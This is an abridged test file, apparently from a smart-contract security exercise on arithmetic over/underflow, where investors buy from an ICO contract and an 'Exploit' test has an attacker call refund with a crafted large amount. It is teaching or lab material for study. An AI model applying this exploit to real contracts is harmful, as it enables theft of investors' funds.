...
describe("Arithmetic Over/Underflow Exercise 3", function () {
  ...
  before(async function () {
    ...
    this.initialAttackerBalance = await ethers.provider.getBalance(
      attacker.address
    );
    expect(this.initialAttackerBalance).to.be.equal(
  ...
  it("Investments Tests", async function () {
    ...
    await this.ico
      .connect(investor1)
      .buy(FIRST_INVESTOR_INVESTED.mul(10), { value: FIRST_INVESTOR_INVESTED });
    await this.ico.connect(investor2).buy(SECOND_INVESTOR_INVESTED.mul(10), {
      value: SECOND_INVESTOR_INVESTED,
    });
    await this.ico
      .connect(investor3)
      .buy(THIRD_INVESTOR_INVESTED.mul(10), { value: THIRD_INVESTOR_INVESTED });
  ...
  it("Exploit", async function () {
    ...
    await this.ico
      .connect(attacker)
      .refund(ethers.BigNumber.from("6740000000000000000000"));
